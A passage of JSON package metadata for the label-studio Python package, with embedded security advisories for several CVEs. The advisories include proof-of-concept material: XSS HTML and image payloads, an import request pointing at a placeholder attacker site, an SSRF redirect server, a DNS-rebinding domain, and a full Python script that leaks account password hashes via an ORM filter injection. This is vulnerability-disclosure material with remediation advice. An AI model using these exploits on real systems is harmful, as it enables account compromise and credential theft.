file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"1.9.2.post0":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: Apache Software License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":null,"project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/1.9.2.post0/","requires_dist":["wheel (<=0.40.0,>=0.38.1)","appdirs (>=1.4.3)","attr (==0.3.1)","attrs (>=19.2.0)","pyyaml (>=6.0.0)","azure-storage-blob (>=12.6.0)","boto (~=2.49.0)","boto3 (==1.28.58)","botocore (==1.31.58)","bleach (~=5.0.0)","google-api-core (==2.11.0)","google-auth (==2.14.1)","google-cloud-appengine-logging (==1.1.0)","google-cloud-audit-log (==0.2.0)","google-cloud-core (==2.3.2)","google-cloud-storage (~=2.5.0)","google-cloud-logging (~=2.7.0)","google-resumable-media (==2.3.3)","googleapis-common-protos (==1.56.4)","grpc-google-iam-v1 (==0.12.4)","Django (==3.2.20)","django-storages (==1.12.3)","django-annoying (==0.10.6)","django-debug-toolbar (==3.2.1)","django-environ (==0.10.0)","django-filter (==2.4.0)","django-model-utils (==4.1.1)","django-rq (==2.5.1)","django-cors-headers (==3.6.0)","django-extensions (==3.1.0)","django-user-agents (==0.4.0)","django-ranged-fileresponse (>=0.1.2)","drf-dynamic-fields (==0.3.0)","djangorestframework (==3.13.1)","drf-flex-fields (==0.9.5)","humansignal-drf-yasg (>=1.21.9)","drf-generators (==0.3.0)","htmlmin (==0.1.12)","jsonschema (==3.2.0)","lockfile (>=0.12.0)","lxml (>=4.2.5)","defusedxml (>=0.7.1)","numpy (==1.24.3)","ordered-set (==4.0.2)","pandas (>=0.24.0)","protobuf (<4.0.0,>=3.15.5)","psycopg2-binary (==2.9.6)","pydantic (<=1.11.0,>=1.7.3)","python-dateutil (>=2.8.1)","pytz (~=2022.1)","requests (==2.31.0)","urllib3 (==1.26.17)","rq (==1.10.1)","rules (==2.2)","ujson (>=3.0.0)","xmljson (==0.2.0)","colorama (>=0.4.4)","boxing (>=0.1.4)","redis (~=3.5)","sentry-sdk (>=1.1.0)","launchdarkly-server-sdk (==7.5.0)","python-json-logger (==2.0.4)","label-studio-converter (==0.0.57)","mysqlclient ; extra == 'mysql'"],"requires_python":">=3.6","summary":"Label Studio annotation tool","version":"1.9.2.post0","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"da7225cec1a065b92c99d1aed3d0a17c65676ffcd9d74aac145b40936bc97116","md5":"f1864b6d5fdde3567bfe0651249d7e7d","sha256":"2b92ffbaffd482b5df828c906e3df534f56c9a8d9a47cb2da34f4a325f01c3c7"},"downloads":-1,"filename":"label_studio-1.9.2.post0-py3-none-any.whl","has_sig":false,"md5_digest":"f1864b6d5fdde3567bfe0651249d7e7d","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.6","size":58031794,"upload_time":"2023-11-08T19:48:29","upload_time_iso_8601":"2023-11-08T19:48:29.383681Z","url":"https://files.pythonhosted.org/packages/da/72/25cec1a065b92c99d1aed3d0a17c65676ffcd9d74aac145b40936bc97116/label_studio-1.9.2.post0-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"96024bc3df6ee24bc58e32c89755c82f07fad3bcf1b43364e848c7c28065e6d7","md5":"50dd49a17b53180914c04a2ff3163d68","sha256":"a3c483ada57c6dc5c7f6a03cafc1bcefea5eb1c8768954b1de8bf18c44b8ed19"},"downloads":-1,"filename":"label-studio-1.9.2.post0.tar.gz","has_sig":false,"md5_digest":"50dd49a17b53180914c04a2ff3163d68","packagetype":"sdist","python_version":"source","requires_python":">=3.6","size":56908681,"upload_time":"2023-11-08T19:48:35","upload_time_iso_8601":"2023-11-08T19:48:35.964567Z","url":"https://files.pythonhosted.org/packages/96/02/4bc3df6ee24bc58e32c89755c82f07fad3bcf1b43364e848c7c28065e6d7/label-studio-1.9.2.post0.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = 